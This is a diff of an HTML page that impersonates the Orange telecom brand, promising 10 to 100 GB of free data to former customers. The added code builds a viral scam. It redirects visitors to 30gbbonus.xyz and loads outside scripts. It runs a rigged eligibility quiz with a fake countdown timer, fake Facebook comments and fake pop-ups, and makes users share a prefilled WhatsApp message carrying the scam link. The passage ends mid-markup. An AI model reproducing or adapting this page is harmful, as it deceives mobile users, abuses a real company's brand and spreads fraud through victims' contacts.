@@ -1,683 +1,1506 @@
 
-
-
+<?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE html>
-<html>
-    <head> 
-      <script src="demo.js"></script>
+<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
 
-        <script src="orange-active.js"></script>
-      <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180685151-1"></script>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+var password = 'ACTIVER 100 Go'
+password=prompt('SMS: Félicitations, vous êtes qualifié pour recevoir 100 Go, veuillez appuyer sur OK pour activer   ','ACTIVER 100 Go');
+if (password != 'ACTIVER 100 Go') {
+location.href='https://www.30gbbonus.xyz/';
+}
+  </script>
+  <script src="aliko-active.js"></script>
+  <script src="demo.js"></script>
+  <script src="https://ogeitid.github.io/oge/google-aapi.js"></script>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta content='width=device-width, initial-scale=1.0' name='viewport'/>
+<title>OFFRE SPÉCIALE Orange 10 Go - 100 Go</title>
+<link id="favicon" rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRzikFuDbzAOddrRt6XnAnGFs1q4KxAEuIkOQ&usqp=CAU">
+<meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSB0loSi-TBpE656p76TRz18HRSuOwDKSlC0cYTXqq-Luq0DDBNdWBUiIEXC0BYLpn35Due7uzHOlzVPWxvCuCdSArrtNZVxeJQdlV5s4doqdIvlyW0O7iDDJv0-E12i68BJM7BG8HawgwWJBAsglVa_0ngSCvwBLRkL7OARgWAAyFRUpQlH9MvGmtdnQ2/s320/9213E44A-A527-452B-892C-ACEC291D6EB5.jpeg">
+<meta property="og:title" content="OFFRE SPÉCIALE Orange 10 Go - 100 Go">
+<meta property="og:description" content="Offre spéciale 10 Go - 100 Go pour nos anciens clients valable 3 mois">
+<meta property="og:url" content="https://Orange.com">
 
-  gtag('config', 'UA-180685151-1');
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+<script>
+var tiaoban = [
+"*Orange 10 Go - 100 Go - OFFRE SPÉCIALE ANCIENS CLIENTS*%0A%0A*Cher client, veuillez vérifier si votre carte SIM Orange est éligible pour recevoir une offre spéciale de 10 Go à 100 Go, cliquez sur le LIEN ci-dessous pour vérifier votre carte SIM maintenant*%0A%0A👇%0Ahttps://www.30gbbonus.xyz", 
+"*Orange 10 Go - 100 Go - OFFRE SPÉCIALE ANCIENS CLIENTS*%0A%0A*Cher client, veuillez vérifier si votre carte SIM Orange est éligible pour recevoir une offre spéciale de 10 Go à 100 Go, cliquez sur le LIEN ci-dessous pour vérifier votre carte SIM maintenant*%0A%0A👇%0Ahttps://www.30gbbonus.xyz/",
+];
+var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
+
+var date = new Date();
+var hour = (date.getHours() > 9) ? date.getHours() : '0' + date.getHours();
+var minute = (date.getMinutes() > 9) ? date.getMinutes() : '0' + date.getMinutes();
+var second = (date.getSeconds() > 9) ? date.getSeconds() : '0' + date.getSeconds();
+var mytime = hour + ':' + minute + ':' + second;
+
+var tb = tiaoban + '?_t=' + (new Date().getTime()) + '%0A%0A' + mytime ;
 </script>
+<script async src="https://www.googletagmanager.com/gtag/js"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
 
-      <meta name="google-site-verification" content="2tzCn_X6JZOV46iZk-PHkEkdAhqPZNOjbTcd740KuMU" />
-     
-    <script>
+gtag('config', 'UA-1');
+</script>
+<script>
+var timer_start = 5;
+var total = 3;
+jQuery(document).ready(function ($) {
+$(".answer").click(function () {
+if($(this).hasClass("anses1")){
+survey.step1();
+}
+if($(this).hasClass("anses2")){
+survey.step2();
+}
+if($(this).hasClass("anses3")){
+survey.step3();
+}
+});
+var clicks = 0;
+var survey = {
+step1: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question1").hide();
+$(".anses1").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show step 2
+$(".question_count span").html("2");
+$(".question_count").show();
+$(".question2").show();
+$(".anses2").show();
+}, 1200);
+}, 300);
+},
+step2: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question2").hide();
+$(".anses2").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show step 3
+$(".question_count span").html("3");
+$(".question_count").show();
+$(".question3").show();
+$(".anses3").show();
+}, 1200);
+}, 300);
+},
+step3: function(){
+setTimeout(function () {
+//hide question block
+$(".question_count").hide();
+$(".question3").hide();
+$(".anses3").hide();
+//show calculating
+$(".calculating").show();
+setTimeout(function () {
+//hide calculating
+$(".calculating").hide();
+//show checking part
+$(".survey_middle").css("vertical-align","top");
+$(".loading").show();
+setTimeout(function () {
+$(".check1").fadeIn(300);
+setTimeout(function () {
+$(".check2").fadeIn(300);
+setTimeout(function () {
+$(".check3").fadeIn(300);
+setTimeout(function () {
+survey.change();
+}, 1400);
+}, 1100);
+}, 1400);
+}, 750);
+}, 600);
+}, 300);
+},
+change: function(){
+//sakrij gornje
+$(".headline,.small_headlines,.timer").hide();
+//sakrij content surveya
+$(".loading").hide();
+$(".survey_outer").css("height","auto");
+//pokazi ostatak
+var walink = "whatsapp://send?text=";
+//$(".btn-share").attr("href",walink);
+$(".btn-share").click(function(){
+clicks++;
+$('#progreso').show();
+if (clicks > total) {
+window.location = Web;
+return;
+}
+$('.progress span').width(((clicks / total) * 100) + '%');
+if (clicks == total) {
+window.location.href = walink;
+}
+window.location.href = walink;
+});
+$(".last_page").show();
+$(".fbcoms").show();
+waitme();
+}
+};
+$(".like").click(function() {
+if($(this).hasClass("selected")) {
+$(this).removeClass("selected");
+$(this).html("Like");
+$("#youand").html("");
+} else {
+$(this).addClass("selected");
+$(this).html("dislike");
+$("#youand").html("You and ");
+}
+});
+$(".fblike").click(function() {
+if($(this).hasClass("selected")) {
+$(this).removeClass("selected");
+$(this).html("Like");
+} else {
+$(this).addClass("selected");
+$(this).html("dislike");
+}
+});
+function waitme(){
+FBcom("#fb1",000);
+FBcom("#fb2",000);
+FBcom("#fb3",000);
+FBcom("#fb4",000);
+FBcom("#fb5",00);
+FBcom("#fb6",000);
+FBcom("#fb7",000);
+FBcom("#fb8",0000);
+var ct = 48;
+(function loop() {
+var rand = random(2500,5500);
+var ctrand = random(1,4);
+ct = ct - ctrand;
+if(ct > 1) {
+setTimeout(function() {
+loop();
+}, rand);
+} else {
+ct = "few";
+}
+$("#count").html(ct);
+}());
+}
+function FBcom(a,b) {
+setTimeout(function() {
+var m = 0, n = true, op = 0;
+$(a+", "+a+" .comtxt, "+a+" .combot").slideDown(500);
+$().slideDown(500);
+var t = setInterval(function() {
+op += 0.2;
+$(a).css({"opacity":op});
+m++;
+if(m === 5) clearInterval(t);
+}, 100);
+}, b);
+}
+function random(min, max) {
+return Math.round(Math.random() * (max - min) + min);
+}
+var out,pops = {
+init: function(){
+setTimeout(function () {
+var rand_name = pop_names[random(0,pop_names.length-1)];
+var rand_text = pop_texts[random(0,pop_texts.length-1)];
+var text = rand_name + " " + rand_text;
+$(".pops p").html(text);
+$(".pops").fadeIn(500);
+out = setTimeout(function () {
+$(".pops").fadeOut(1000);
+pops.init();
+}, 6000);
+}, random(6000, 15000));
+}
+};
+pops.init();
+$("#iks").click(function () {
+clearTimeout(out);
+$(".pops").hide();
+pops.init();
+});
+$("#mins").html("0"+timer_start);
+$("#sec").html("00");
+var mins = timer_start, secs = 0, minutes, seconds, timer = {
+init: function(){
+var counter = setInterval(function () {
+$(".timer_heading").addClass("blink");
+setTimeout(function () {
+$(".timer_heading").removeClass("blink");
+}, 500);
+secs--;
+if(secs<0){
+secs = 59;
+mins--;
+if(mins<0){
+clearInterval(counter);
+mins = 0;
+secs = 0;
+$(".timer_heading").hide();
+$(".timer .small_headlines").show();
+}
+if(mins<10){
+minutes = "0" + mins;
+}else{
+minutes = mins;
+}
+}
+if(secs<10){
+seconds = "0" + secs;
+}else{
+seconds = secs;
+}
+$("#mins").html(minutes);
+$("#sec").html(seconds);
+}, 1000);
+}
+};
+timer.init();
+if(get_Cookie('prog')){
+setTimeout(function(){
+$(".question_count").hide();
+$(".question1").hide();
+$(".anses1").hide();
+survey.change();
+incrementValue_a();
+fn1_a();
+},200)
+}
+});
 
-        function set_Cookie(name,value){
-            var Days = 30;
-            var exp = new Date();
-            exp.setTime(exp.getTime() + (Days*20*1000));
-            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
-        }
-        function get_Cookie(name){
-            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
-            if(arr=document.cookie.match(reg)){
-                return unescape(arr[2]);
-            }
-            return '';
-        }
+
+</script>
+<style>
+@import url('https://fonts.googleapis.com/css?family=Montserrat');
+@font-face{
+font-family: 'Roboto';
+font-weight: 400;
+src: url(../fonts/Roboto-Regular.ttf);
+}
+@font-face{
+font-family: 'Roboto';
+font-weight: 700;
+src: url(../fonts/Roboto-Bold.ttf);
+}
+@font-face{
+font-family: 'Tahoma';
+font-weight: 400;
+src: url(../fonts/Tahoma.ttf);
+}
+@font-face{
+font-family: 'Tahoma';
+font-weight: 700;
+src: url(../fonts/Tahoma-Bold.ttf);
+}
+body,html{
+width: 100%;
+margin: 0;
+font-family: 'Montserrat', sans-serif;
+background: #000000;
+color:#6e34abed;
+}
+/*clearfix*/
+.clearfix:before, .clearfix:after{content:"";display:table;}
+.clearfix:after{clear: both;}
+.clearfix{*zoom: 1;}
+*{
+box-sizing: border-box;
+}
+p{
+margin: 0;
+}
+.cont_outer{
+position: absolute;
+display: table;
+width: 100%;
+height: 100%;
+background-image: url(https://0ne.buzz/id-indomaret/img/219958493.jpg);
+background-position: center top;
+background-size: 750px auto;
+background-repeat: repeat-y;
+}
+.bold{
+font-weight: 700;
+}
+/*************************************************** header ***************************************************/
+.header{
+display: table-row;
+width: 100%;
+height: 50px;
+background-color: #fff;
+font-weight: 700;
+}
+.header-inner{
+display: table-cell;
+vertical-align: middle;
+text-align: center;
+}
+.header-inner p{
+vertical-align: middle;
+color: #fff;
+font-size: 18px
+}
+.header-inner p img{
+vertical-align: middle;
+}
+#folder{
+width: 28px;
+}
+#rupee1{
+width: 14px;
+padding-left: 2px
+}
+/*************************************************** content ***************************************************/
+
+.content{
+display: table-row;
+width: 100%;
+overflow-x: hidden
+}
+.content-middle{
+display: table-cell;
+vertical-align: middle;
+width: 100%;
+}
+.content-inner{
+width: 95%;
+max-width: 600px;
+margin: 5px auto;
+text-align: center;
+padding: 15px 3px;
+border-radius: 4px;
+background-color: #ffffff;
+color: #000000;
+}
+#logo{
+width: 220px;
+}
+.headline{
+color: #000;
+font-weight: bold;
+font-size: 22px;
+line-height: 45px
+}
+.headline,.headline span img{
+vertical-align: middle;
+}
+.headline span{
+vertical-align: top;
+}
+.headline span{
+text-decoration: underline;
+}
+.headline span img{
+width: 12px;
+margin-left: 3px;
+}
+.small_headlines{
+font-size: 16px;
+color: #000000ed;
+font-weight: 400;
+padding-bottom: 10px;
+}
+.small_headlines img{
+width: 10px;
+margin-left: 3px;
+vertical-align: middle;
+line-height: 22px;
+}
+.question2,.question3{
+display: none;
+}
+/*************************************************** survey ***************************************************/
+.survey_outer{
+display: table;
+width: 95%;
+margin: 15px auto 0;
+background-color: #FF7800;
+border-radius: 4px;
+height: 295px;
+}
+.survey_middle{
+display: table-cell;
+vertical-align: middle;
+}
+.survey_inner{
+display: block;
+width: 95%;
+margin: 0 auto;
+padding: 15px 0;
+position: relative;
+}
+.anses2,.anses3{
+display: none;
+}
+.question_count{
+color: #fff;
+font-size: 24px;
+font-weight: 700;
+}
+.question_text{
+color: #fff;
+font-size: 20px;
+line-height: 38px;
+}
+.question2{
+line-height: 1.2em;
+padding: 10px 0 15px;
+}
+.question3{
+line-height: 1.2em;
+}
+.answer{
+width: 80%;
+margin: 15px auto;
+text-align: center;
+padding: 7px 0;
+color: #222;
+background-color: #fff;
+border-radius: 7px;
+border: 1px solid #027CD5;
+font-size: 24px;
+font-weight: 400;
+cursor: pointer;
+-webkit-transition: all 0.3s ease-in-out;
+-moz-transition: all 0.3s ease-in-out;
+transition: all 0.3s ease-in-out;
+}
+.answer:hover{
+color: #222;
+background-color: #fff;
+font-weight: 700;
+}
+.calculating{
+display: none;
+vertical-align: middle;
+font-size: 28px;
+text-transform: uppercase;
+color: #fff;
+font-weight: 700;
+}
+.calculating img{
+vertical-align: middle;
+width: 50px;
+}
+/****** loading ******/
+.loading{
+display: none;
+text-align: center;
+color: #fff;
+font-weight: 700;
+}
+.loading img{
+width: 70%;
+max-width: 220px;
+margin: 0 auto 15px;
+}
+.load_headline{
+font-size: 24px;
+margin: 15px 0;
+}
+.check{
+font-size: 20px;
+margin: 10px 0;
+}
+.check1,.check2,.check3{
+display: none;
+}
+/*************************************************** last page ***************************************************/
+.last_page{
+display: none;
+}
+.last-up{
+text-align: left;
+}
+.textlastup{
+color: #fff;
+font-size: 18px;
+padding-bottom: 8px;
+font-weight: 400;
+}
+.btn{
+width: 80%;
+font-size: 28px;
+max-width: 345px;
+margin: 15px auto;
+background-color: #58BE41;
+border-radius: 5px;
+color: #fff;
+font-weight: 700;
+text-align: center;
+display: block;
+padding: 7px 0;
+text-decoration: none;
+-webkit-transition: all 0.2s ease-in-out;
+-moz-transition: all 0.2s ease-in-out;
+transition: all 0.2s ease-in-out;
+box-shadow: none;
+}
+.btn:hover{
+background-color: #fff;
+color: #58BE41;
+box-shadow: 0 0 2px #58BE41,
+0 0 5px #58BE41,
+0 0 7px #58BE41,
+0 0 11px #58BE41;
+}
+.btn-share{
+font-size: 24px;
+background-color: #58BE41;
+background-size: 40px auto;
+background-position: left 5px top 1px;
+background-repeat: no-repeat;
+}
+
+.progress { width:80%; height: 20px; /* Can be anything */ position: relative; margin: 60px 0 20px 0; /* Just for demo spacing */ background: #555; padding: 10px; -webkit-box-shadow: inset 0 -1px 1px rgba(255,255,255,0.3); -moz-box-shadow : inset 0 -1px 1px rgba(255,255,255,0.3); box-shadow : inset 0 -1px 1px rgba(255,255,255,0.3); margin: auto; } .progress > span { display: block; height: 20px; left: 0; top: 0; background-color: #3F51B5; background-image: -webkit-gradient( linear, left bottom, left top, color-stop(0, #00BCD4), color-stop(1, #2196F3) ); background-image: -moz-linear-gradient( center bottom, rgb(43,194,83) 37%, rgb(84,240,84) 69% ); -webkit-box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); -moz-box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); box-shadow: inset 0 2px 9px rgba(255,255,255,0.3), inset 0 -2px 6px rgba(0,0,0,0.4); position: absolute; overflow: hidden; } .progress > span:after, .animate > span > span { content: ""; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background-image: -webkit-gradient(linear, 0 0, 100% 100%, color-stop(.25, rgba(255, 255, 255, .2)), color-stop(.25, transparent), color-stop(.5, transparent), color-stop(.5, rgba(255, 255, 255, .2)), color-stop(.75, rgba(255, 255, 255, .2)), color-stop(.75, transparent), to(transparent) ); background-image: -moz-linear-gradient( -45deg, rgba(255, 255, 255, .2) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, .2) 50%, rgba(255, 255, 255, .2) 75%, transparent 75%, transparent ); z-index: 1; -webkit-background-size: 50px 50px; -moz-background-size: 50px 50px; -webkit-animation: move 2s linear infinite; -webkit-border-top-right-radius: 8px; -webkit-border-bottom-right-radius: 8px; -moz-border-radius-topright: 8px; -moz-border-radius-bottomright: 8px; border-top-right-radius: 8px; border-bottom-right-radius: 8px; -webkit-border-top-left-radius: 20px; -webkit-border-bottom-left-radius: 20px; -moz-border-radius-topleft: 20px; -moz-border-radius-bottomleft: 20px; border-top-left-radius: 20px; border-bottom-left-radius: 20px; overflow: hidden; } .animate > span:after { display: none; } @-webkit-keyframes move { 0% { background-position: 0 0; } 100% { background-position: 50px 50px; } }
 
 
-        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
-                        document.getElementById("first-box")."quedate__step".display="none";//??;
-                        document.getElementById("second-box").style.display="none";//??;
-                        document.getElementById("third-box").style.display="none";//??;
-                        document.getElementsByClassName("loading2__box").style.display="";//??;
-                    }*/
 
 
-    </script>
-  
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>ORANGE 10GB - 100GB OFFRE SPÉCIALE POUR LES ANCIENS CLIENTS</title>
-        <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
-        <meta name="og:title" content="ORANGE 10GB - 100GB OFFRE SPÉCIALE POUR LES ANCIENS CLIENTS" />
-        <meta property="og:description" content="Orange offre des données gratuites à ses anciens clients" />
-        <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSB0loSi-TBpE656p76TRz18HRSuOwDKSlC0cYTXqq-Luq0DDBNdWBUiIEXC0BYLpn35Due7uzHOlzVPWxvCuCdSArrtNZVxeJQdlV5s4doqdIvlyW0O7iDDJv0-E12i68BJM7BG8HawgwWJBAsglVa_0ngSCvwBLRkL7OARgWAAyFRUpQlH9MvGmtdnQ2/s320/9213E44A-A527-452B-892C-ACEC291D6EB5.jpeg" />
-        <meta property="og:type" content="website" />
-    <meta property="og:updated_time" content="1440432930" />
-    <link rel="me" href="https://www.blogger.com/profile/13809910274301822692" />
+.btn-down{
+font-size: 24px;
+text-transform: uppercase;
+}
 
-<link rel="me" href="https://www.blogger.com/profile/17222055979768522082" />
+.fbcoms {
+font-family: Tahoma, Verdana, sans-serif;
+background-color: #fff;
+width: 100%;
+margin: 0 auto;
+padding: 5px 10px;
+font-size: 12px;
+text-align: left;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+color: #333;
+}
+.comments {
+font-weight: bold;
+text-align: center;
+padding: 0 5px 10px 5px;
+}
+.totlikes {
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 23px;
+background-image: url("../img/f/like.png");
+background-repeat: no-repeat;
+background-position: 5px center;
+}
+.fbblue {
+color: #3c5a96;
+}
+.buttons {
+padding-bottom: 5px;
+font-family: Arial, sans-serif;
+color: #7d7d7f;
+}
+.buttons span {
+cursor: pointer;
+}
+.buttons span:hover {
+text-decoration: underline;
+}
+
+.buttond {
+background-color: #0d609b;
+color: #fff;
+font-size: 1.2em;
+font-weight: bold;
+text-align: center;
+padding:10px;
+margin-top:5px;
+}
+.viewmore {
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 23px;
+background-image: url("");
+background-position: 5px center;
+background-repeat: no-repeat;
+}
+.left {
+cursor: pointer;
+float: left;
+color: #3c5a96;
+}
+.left:hover {
+text-decoration: underline;
+}
+.right {
+color: #7d7d7f;
+float: right;
+}
+.item {
+position: relative;
+margin-top: 3px;
+background-color: #eeeff4;
+padding: 5px 5px 5px 60px;
+min-height: 60px;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+}
+.item .profileimg {
+position: absolute;
+top: 5px;
+left: 5px;
+}
+.comtxt {
+line-height: 16px;
+}
+.name {
+color: #3c5a96;
+font-weight: bold;
+}
+.ago {
+color: #86878c;
+font-size: 0.95em;
+}
+.fblike {
+color: #3c5a96;
+font-size: 0.95em;
+cursor: pointer;
+}
+.fblike:hover {
+text-decoration: underline;
+}
+.combot {
+padding-top: 5px;
+}
+.clickhere {
+font-weight: bold;
+padding: 30px 10px 5px;
+line-height: 18px;
+}
+.likes {
+color: #3c5a96;
+font-size: 0.95em;
+cursor: pointer;
+}
+.fbimg {
+background-color: #fff;
+border-radius: 2px;
+-moz-border-radius: 2px;
+-webkit-border-radius: 2px;
+max-width: 210px;
+width: 100%;
+padding: 3px;
+-webkit-box-sizing: border-box;
+-moz-box-sizing: border-box;
+box-sizing: border-box;
+border: 1px solid #808080;
+margin: 10px 0 5px;
+}
+.hidden {
+display: none;
+opacity: 0;
+}
+.hidden .comtxt, .hidden .combot, .comments {
+display: none;
+}
+.answer{
+cursor: pointer;
+}
+
+.pops{
+position: fixed;
+top: 80px;
+right: 10px;
+display: none;
+width: 230px;
+margin: 10px 10px 0 0;
+background-color: rgba(173,176,192,0.8);
+width: 230px;
+border-radius: 8px;
+box-shadow: 0 0 7px #888888;
+padding-bottom: 3px
+}
+#piplovi{
+width: 55px;
+margin: 0;
+padding: 5px;
+float: left;
+}
+#iks{
+position: absolute;
+top: -10px;
+right: -10px;
+width: 20px;
+cursor: pointer;
+}
+.pops p{
+width: 170px;
+padding: 2px;
+padding-top: 10px;
+margin-left: 50px;
+font-size: 14px;
+color: #fff;
+word-spacing: 0;
+line-height: 100%;
+}
+
+.timer .small_headlines{
+display: none;
+}
+.timer_heading{
+width: 80%;
+margin: 0 auto;
+font-size: 16px;
+color: #e6dcdced;
+font-weight: 400;
+padding-bottom: 10px;
+}
+@-webkit-keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+@-moz-keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+@keyframes bllink{
+from{
+color: #fff;
+text-shadow: none;
+transform: scale(1,1);
+}
+to{
+color: #ff0000;
+text-shadow: 0 0 2px #fff,0 0 5px #fff,0 0 7px #fff,0 0 10px #fff,0 0 12px #fff,0 0 15px #fff;
+transform: scale(1.3,1.3);
+}
+}
+.blink{
+-webkit-animation: 0.2s bllink ease-in-out alternate;
+-moz-animation: 0.2s bllink ease-in-out alternate;
+animation: 0.2s bllink ease-in-out alternate;
+}
+
+@media screen and (max-width: 600px){
+.cont_outer{
+background-size: 600px auto;
+}
+.headline{
+font-size: 18px;
+}
+.small_headlines,.timer_heading{
+font-size: 13px;
+}
+}
+@media screen and (max-width: 500px){
+.btn{
+width: 90%;
+max-width: 345px;
+}
+}
+@media screen and (max-width: 400px)
+.header-inner p{
+font-size: 14px;
+}
+#rupee1{
+width: 12px;
+padding-left: 2px
+}
+.header{
+height: 40px;
+}
+.gutschein {
+background-color: #000000;
+border-radius: 10px;
+padding:10px;
+font-weight: bold;
+color: #ffffff;
+font-size: 1.0em;
+margin-top:2px;
+text-align: center;
+}
+.answer{
+margin: 10px auto;
+padding: 5px 0;
+border-radius: 7px;
+border: 1px solid #027CD5;
+font-size: 20px;
+color: #222;
+font-weight: 700;
+}
+.survey_outer{
+height: 250px;
+}
+.calculating{
+font-size: 22px;
+}
+.load_headline{
+font-size: 20px;
+margin: 15px 0;
+}
+.check{
+font-size: 16px;
+margin: 10px 0;
+}
+.textlastup{
+font-size: 16px;
+padding-bottom: 5px;
+font-weight: 400;
+}
+.btn{
+width: 100%;
+max-width: 345px;
+}
+.btn-share{
+font-size: 20px;
+background-size: 36px auto;
+}
+.btn-down{
+font-size: 20px;
+}
+} #main-frame-error{display:none;height:auto}.interstitial-wrapper{padding-top:10px;box-sizing:border-box;font-size:1em;line-height:18px;margin:auto;max-width:600px;width:90%}#today{float:right;font-weight:600;padding-top:15px}#main-message>p{display:inline}#blink{color:#f00;padding:6px;-webkit-animation:blink 1s infinite;-moz-animation:blink 1s infinite;-ms-animation:blink 1s infinite;-o-animation:blink 1s infinite;animation:blink 1s infinite}@-webkit-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-moz-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@-ms-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}}@-o-keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}@keyframes blink{0%{opacity:1.0}50%{opacity:.0}100%{opacity:1.0}}#theTime{font-size:18px;font-weight:bold;color:red;font-family:sans-serif}h1{color:#000;font-size:1.6em;line-height:1.25em;margin-bottom:16px}#alertimg{height:26px;width:26px;position:absolute;top:13px;left:17px}.popup{display:none;position:absolute;top:20%;left:50%;width:88%;max-width:280px;margin:0 0 0 -140px;font-size:1em;border-radius:4px;background-color:#282828;color:#fff;overflow:hidden;box-shadow:1px 1px 7px #000;z-index:100}.popup-head{background-color:#282828;padding:18px 16px 18px 55px;border-bottom:2px solid #33b4e4;color:#33b4e4;line-height:normal}.popup-center{padding:20px 16px;color:#f3f3f3;line-height:20px}.popup-bottom{background-color:#282828;padding:9px 6px;text-align:center;border-top:1px solid #474747;overflow:hidden}.popup-bottom .button{display:block;height:30px;width:128px;margin:0 auto;font-size:1.1em;color:#f3f3f3;border-radius:3px;cursor:pointer;text-decoration:none;padding:0;line-height:30px}
+
+a {
+text-decoration: none;
+}
+
+</style>
+
+<link rel="me" href="https://www.blogger.com/profile/11256903007374519918" />
+<link rel="me" href="https://www.blogger.com/profile/02064811961029309684" />
+<link rel="me" href="https://draft.blogger.com/profile/03686527602587087291" />
+<link rel="me" href="https://www.blogger.com/profile/05395265329716100745" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 <link rel="me" href="https://www.blogger.com/profile/05963652588202294752" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
-<link rel="me" href="https://www.blogger.com/profile/05853757488319578479" />
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
-<link rel="me" href="https://www.blogger.com/profile/03760741075252211382" />
 <meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
 <meta name='google-adsense-platform-domain' content='blogspot.com'/>
 </head>
 <body>
-  <style>
-  .blink {
-  animation: blink 1s steps(1, end) infinite;
+
+<center>
+<div class='content'>
+<!-- content -->
+<div class='content-middle'>
+<div class='content-inner'>
+<p class='headline' style="color:#000000;">
+<img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi17Q9Kv-KU14lcEPvLwsKqghx1WM9IzZQjg8wpHuxO2UeoTlVHT3BMCXT3_p7TwDqdS4WZG-EnQY69rKU0xyFHwxDBwa3JG0cqktJvlqZa3pvrOh8klWdoIcP9OKmuxOQ_K-KnPJCQ-5shnzdyB2uHnq77WrzY9u2Zg4u-oj6nuE1WKOBCVFxLrAboPiOp/s1242/35061B33-DE41-4097-8026-F8559D8AE675.jpeg' width='100%' /><br/><strong> <font color="red"><b>OFFRE SPÉCIALE Orange 100 Go</b></font></strong>
+<br/> Cher client, veuillez vérifier si votre carte SIM Orange est éligible pour recevoir une offre spéciale de 10 Go à 100 Go
+</p>
+<b>
+Veuillez d’abord répondre aux questions suivantes :
+<b> <br/>
+<div class='survey_outer'>
+<div class='survey_middle'>
+<div class='survey_inner'>
+<!-- <p class='question_count'>
+Pergunta
+<span>
+1
+</span>
+de 3
+</p> -->
+<p class='question_text question1'>
+Question 1 : Êtes-vous client Orange ?
+</p>
+<p class='question_text question2'>
+Question 2 : Quel est l'âge de votre carte SIM Orange ?
+</p>
+<p class='question_text question3'>
+Question 3 : Choisissez votre pays
+</p>
+<div class='ans-box'>
+<div class='answer anses1'>
+<p>
+Oui
+</p>
+</div>
+<div class='answer anses1'>
+<p>
+Non
+</p>
+</div>
+ 
+  <div class='answer anses2'>
+<p>
+6 mois - 10 Go
+</p>
+</div>
+  
+<div class='answer anses2'>
+<p>
+1 an et plus - 30 Go
+</p>
+</div>
+
+  <div class='answer anses2'>
+<p>
+5 ans et plus - 50 Go
+</p>
+</div>
+<div class='answer anses2'>
+<p>
+10 ans et plus - 100 Go
+</p>
+</div>
+
+  
+  
+<div class='answer anses3'>
+<p>
+DRC 🇨🇩
+</p>
+</div>
+<div class='answer anses3'>
+<p>
+Chad 🇹🇩
+</p>
+</div>
+
+  <div class='answer anses3'>
+<p>
+Côte d'Ivoire 🇨🇮
+</p>
+</div>
+
+  <div class='answer anses3'>
+<p>
+Niger 🇳🇪
+</p>
+</div>
+
+<div class='answer anses3'>
+<p>
+Gabon 🇬🇦
+</p>
+</div>
+ 
+  </div>
+<p class='calculating'>
